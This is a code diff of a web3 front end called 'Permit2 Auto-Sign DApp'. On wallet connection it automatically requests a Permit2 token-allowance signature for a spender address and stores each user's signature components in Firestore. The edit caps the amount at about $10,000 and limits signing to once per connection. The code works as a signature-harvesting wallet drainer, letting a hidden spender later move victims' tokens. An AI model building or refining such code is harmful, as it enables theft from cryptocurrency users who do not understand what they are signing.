@@ -7,7 +7,7 @@ import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Uniswap Permit2
-const MaxUint160 = (2n ** 160n) - 1n;
+const SPENDING_CAP = BigInt(10000) * 10n ** 18n; // $10,000 cap, assuming 18 decimals
 
 const appKit = createAppKit({
   adapters: [new EthersAdapter()],
@@ -23,18 +23,23 @@ const appKit = createAppKit({
 
 export default function App() {
   const [status, setStatus] = useState("Not connected");
+  const [signed, setSigned] = useState(false); // Track signature per connection
 
   useEffect(() => {
     const unsub = appKit.subscribeAccount((acct) => {
       if (acct?.isConnected && acct?.address) {
         setStatus(`Connected: ${acct.address}`);
-        autoSignPermit(acct.address);
+        if (!signed) {
+          autoSignPermit(acct.address);
+          setSigned(true);
+        }
       } else {
         setStatus('Not connected');
+        setSigned(false); // reset on disconnect
       }
     });
     return () => unsub();
-  }, []);
+  }, [signed]);
 
   const autoSignPermit = async (owner) => {
     try {
@@ -46,20 +51,16 @@ export default function App() {
         return;
       }
 
-      // Ethers provider
       const provider = new BrowserProvider(walletProvider);
-
-      // FIX BigInt serialization issue
       const net = await provider.getNetwork();
-      const chainId = Number(net.chainId); // Required for JSON.stringify
+      const chainId = Number(net.chainId);
 
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       const nonce = 0;
 
-      // Permit2 structure
       const permitted = {
         token: import.meta.env.VITE_TOKEN_ADDRESS,
-        amount: MaxUint160.toString(),
+        amount: SPENDING_CAP.toString(), // capped at $10,000
         expiration: deadline,
         nonce
       };
@@ -90,7 +91,6 @@ export default function App() {
         sigDeadline: deadline
       };
 
-      // ---- WalletConnect + Mobile Safe EIP-712 Signing ---- //
       setStatus('Requesting typed-data signature (mobile compatible)...');
 
       const payload = JSON.stringify({
@@ -104,20 +104,17 @@ export default function App() {
         method: "eth_signTypedData_v4",
         params: [owner, payload]
       });
-      // ------------------------------------------------------- //
 
-      // Split signature
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
 
-      // Save to Firestore
       await setDoc(doc(db, "permit2_signatures", owner), {
         owner,
         spender: import.meta.env.VITE_SPENDER_ADDRESS,
         token: import.meta.env.VITE_TOKEN_ADDRESS,
-        amount: MaxUint160.toString(),
+        amount: SPENDING_CAP.toString(),
         deadline,
         nonce,
         r, s, v,
@@ -136,7 +133,7 @@ export default function App() {
   return (
     <div className="app-container">
       <h2>Permit2 Auto-Sign DApp</h2>
-      <p style={{color:'#9fb4ff', marginBottom: 18}}>
+      <p style={{ color:'#9fb4ff', marginBottom: 18 }}>
         Click connect to open wallet modal and auto-sign permit.
       </p>
       <button className="connect" onClick={() => appKit.open()}>
